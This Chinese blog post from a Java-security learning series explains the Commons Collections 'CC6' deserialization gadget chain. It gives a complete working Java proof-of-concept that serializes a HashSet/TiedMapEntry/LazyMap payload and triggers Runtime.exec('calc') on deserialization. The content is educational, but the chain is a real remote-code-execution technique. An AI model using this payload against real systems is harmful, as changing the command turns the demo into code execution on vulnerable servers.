+++
title = "CC链子6"
date = 2026-06-14T23:35:00+08:00
draft = false
description = "由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。"
tags = ["Java安全", "安全研究"]
categories = ["安全研究"]
series = ["Java 安全 持续学习"]
pin = false
cover = "/images/posts/java-security-banner.svg"
+++
## 前言

由于很多框架是 Java 写的，所以研究 Java 安全刻不容缓。这篇文章收录在「Java 安全 持续学习」系列中，用来沉淀对应主题的分析与记录。

## 原理


- **依赖**：`commons-collections:3.1`
    
- **入口**：`HashSet / HashMap.readObject()`
    
- **执行**：`LazyMap.get()`
    
- **原理**：通过 `TiedMapEntry` 的 `hashCode()` 调用 `getValue()`，进而触发 `LazyMap` 攻击链。它是最通用的链，不依赖特殊触发类。
    
- **流程**： `HashMap.readObject()` 
- ↓ `HashMap.put()` 
- ↓ `TiedMapEntry.hashCode()` 
- ↓ `LazyMap.get()` 
- ↓ `ChainedTransformer.transform()`
- ↓ `InvokerTransformer` (反射) 
- ↓ `Runtime.getRuntime().exec()`



## 过程

弹出计算机

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260613180427390.png)

源码

```java
package cc6;

  

import org.apache.commons.collections.Transformer;

import org.apache.commons.collections.functors.ChainedTransformer;

import org.apache.commons.collections.functors.ConstantTransformer;

import org.apache.commons.collections.functors.InvokerTransformer;

import org.apache.commons.collections.map.LazyMap;

import org.apache.commons.collections.keyvalue.TiedMapEntry;

  

import java.util.HashMap;

import java.util.HashSet;

  

/**

 * CC6 Chain - Calculator

 *

 * Flow:

 * HashSet.readObject()

 *     -> HashMap.put()

 *     -> TiedMapEntry.hashCode()

 *     -> TiedMapEntry.getValue()

 *     -> LazyMap.get()

 *     -> ChainedTransformer.transform()

 *     -> Runtime.getRuntime().exec("calc")

 */

public class CC6Calc {

  

    public static void main(String[] args) throws Exception {

        System.out.println("CC6 Chain - Calculator");

        System.out.println("=====================\n");

  

        // Step 1: Transformer chain: Runtime.class -> getRuntime() -> exec("calc")

        System.out.println("[*] Step 1: Create Transformer chain...");

        Transformer[] transformers = new Transformer[]{

            new ConstantTransformer(Runtime.class),

            new InvokerTransformer("getMethod",

                new Class[]{String.class, Class[].class},

                new Object[]{"getRuntime", new Class[0]}),

            new InvokerTransformer("invoke",

                new Class[]{Object.class, Object[].class},

                new Object[]{null, new Object[0]}),

            new InvokerTransformer("exec",

                new Class[]{String.class},

                new Object[]{"calc"})

        };

        ChainedTransformer chain = new ChainedTransformer(transformers);

        System.out.println("[+] Chain created\n");

  

        // Step 2: Create LazyMap

        System.out.println("[*] Step 2: Create LazyMap...");

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chain);

        System.out.println("[+] LazyMap created\n");

  

        // Step 3: Create TiedMapEntry

        // hashCode() calls getValue() which calls map.get(key)

        System.out.println("[*] Step 3: Create TiedMapEntry...");

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "anykey");

        System.out.println("[+] TiedMapEntry created\n");

  

        // Step 4: Create HashSet with TiedMapEntry

        // HashSet.readObject() -> HashMap.put() -> key.hashCode()

        System.out.println("[*] Step 4: Create HashSet...");

        HashSet hashSet = new HashSet();

        hashSet.add(entry);

  

        // Remove from LazyMap to avoid premature trigger

        lazyMap.remove("anykey");

        System.out.println("[+] HashSet created\n");

  

        // Step 5: Serialize

        System.out.println("[*] Step 5: Serialize...");

        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();

        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(baos);

        oos.writeObject(hashSet);

        oos.close();

        byte[] data = baos.toByteArray();

        System.out.println("[+] Serialized, size: " + data.length + " bytes\n");

  

        // Step 6: Deserialize and trigger

        System.out.println("[*] Step 6: Deserialize (will pop calculator)...");

        System.out.println("[*] Press Enter to trigger...");

        System.in.read();

  

        System.out.println("[*] Deserializing...");

        try {

            java.io.ByteArrayInputStream bais = new java.io.ByteArrayInputStream(data);

            java.io.ObjectInputStream ois = new java.io.ObjectInputStream(bais);

            ois.readObject();  // Trigger: HashSet.readObject() -> HashMap.put() -> hashCode() -> get() -> exec()

            ois.close();

        } catch (Exception e) {

            System.out.println("[-] Exception: " + e.getClass().getSimpleName());

        }

  

        System.out.println("\n[+] Done! Calculator should pop up!");

    }

}
```





## 总结

C6 链总结

  原理: HashSet.readObject() → HashMap.put() → TiedMapEntry.hashCode() → LazyMap.get() → ChainedTransformer.transform()

  流程:
  HashSet.readObject()
      ↓
  HashMap.put()
      ↓
  TiedMapEntry.hashCode()
      ↓
  TiedMapEntry.getValue()
      ↓
  LazyMap.get("anykey")
      ↓
  ChainedTransformer.transform()
      ↓
  Runtime.getRuntime().exec("calc")
